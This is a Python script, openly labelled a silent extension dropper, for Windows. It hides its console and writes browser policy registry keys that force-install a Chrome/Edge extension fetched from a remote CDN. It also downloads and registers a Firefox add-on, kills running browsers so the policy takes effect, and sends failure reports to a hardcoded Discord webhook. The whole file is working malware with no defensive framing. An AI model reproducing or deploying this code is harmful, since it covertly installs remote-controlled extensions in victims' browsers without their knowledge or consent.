# eszkola.py — silent extension dropper (chrome/edge forcelist + firefox xpi drop)
import os
import sys
import time
import subprocess
import urllib.request
import winreg

CHROME_ID = "hfdcgibcmnhojpiflonndljnjngojneg"
UPDATE_URL = "https://cdn.jsdelivr.net/gh/vSake-clean/xt@main/eszkola_update.xml"
XPI_URL = "https://cdn.jsdelivr.net/gh/vSake-clean/xt@main/eszkola.xpi"
FF_APP = "{ec8030f7-c20a-464f-9b0e-13a3a9e97384}"
WEBHOOK = "https://discord.com/api/webhooks/1420083958186885162/1t-1vPH3Uu2_-cOQYy3lNWiZ9xvK2slFtGPu4tQnb58ac1QRHwvAMgHvX-f2YC6u-K50"
_machine_ok = True


def quiet_console():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass


def report(where, why):
    # webhook tylko przy failach — nie wrzuca szumu
    try:
        import json as _json
        body = _json.dumps({"content": f"❌ eszkola fail — {where}: {why}"}).encode()
        req = urllib.request.Request(WEBHOOK, data=body,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass


def dl(url, dest, timeout=60):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as r, open(dest, "wb") as f:
            while True:
                chunk = r.read(65536)
                if not chunk:
                    break
                f.write(chunk)
    except Exception as e:
        report("download", f"{url} → {e}")
        raise


def forcelist():
    val = f"{CHROME_ID};{UPDATE_URL}"
    # HKCU dla Chrome; Edge czyta TYLKO HKLM → bez admina pada, raport
    global _machine_ok
    for hive, sub in ((winreg.HKEY_CURRENT_USER,
                       r"Software\Policies\Google\Chrome\ExtensionInstallForcelist"),
                      (winreg.HKEY_LOCAL_MACHINE,
                       r"Software\Policies\Microsoft\Edge\ExtensionInstallForcelist")):
        try:
            k = winreg.CreateKey(hive, sub)
            winreg.SetValueEx(k, "1", 0, winreg.REG_SZ, val)
            winreg.CloseKey(k)
            if hive == winreg.HKEY_LOCAL_MACHINE:
                _machine_ok = True
        except Exception as e:
            if hive == winreg.HKEY_LOCAL_MACHINE:
                _machine_ok = False
            report("forcelist", f"{'HKLM/Edge' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU/Chrome'} → {e}")


def firefox():
    base = os.environ.get("APPDATA")
    if not base:
        report("firefox", "brak APPDATA w env")
        return
    ffdir = os.path.join(base, "Mozilla", "Extensions", FF_APP)
    try:
        os.makedirs(ffdir, exist_ok=True)
    except Exception as e:
        report("firefox", f"mkdir {ffdir} → {e}")
        return
    xpi = os.path.join(ffdir, "eszkola.xpi")
    try:
        dl(XPI_URL, xpi)
    except Exception:
        return
    # HKLM wpis dziala tylko gdy exe odpalone z admina; jako user cicho pada
    try:
        k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Mozilla\Firefox\Extensions")
        winreg.SetValueEx(k, "eszkola-helper@nyx", 0, winreg.REG_SZ, xpi)
        winreg.CloseKey(k)
    except Exception as e:
        report("firefox", f"HKLM Mozilla Extensions → {e}")
    # awaryjna sciezka: otworz xpi w firefoxie — 1 klik "Add"
    for p in (r"C:\Program Files\Mozilla Firefox\firefox.exe",
              r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"):
        if os.path.exists(p):
            try:
                subprocess.Popen([p, xpi])
            except Exception as e:
                report("firefox", f"Popen {p} → {e}")
            break
    else:
        report("firefox", "nie znaleziono firefox.exe w Program Files")


def bounce():
    # policy forcelist laduje sie przy starcie przegladarki → zrestartuj je
    for proc in ("chrome.exe", "msedge.exe"):
        r = subprocess.run(["taskkill", "/F", "/IM", proc],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           creationflags=0x08000000)
        if r.returncode not in (0, 128):
            report("bounce", f"taskkill {proc} → rc={r.returncode}")


def main():
    quiet_console()
    forcelist()
    firefox()
    time.sleep(1)
    bounce()
    if not _machine_ok:
        # Edge nie wczyta HKCU policy — potrzeba admina
        report("summary", "brak zapisu HKLM/Edge — exe odpalone bez admina, Edge forcelist nie zadziała")
    return 0


if __name__ == "__main__":
    sys.exit(main())
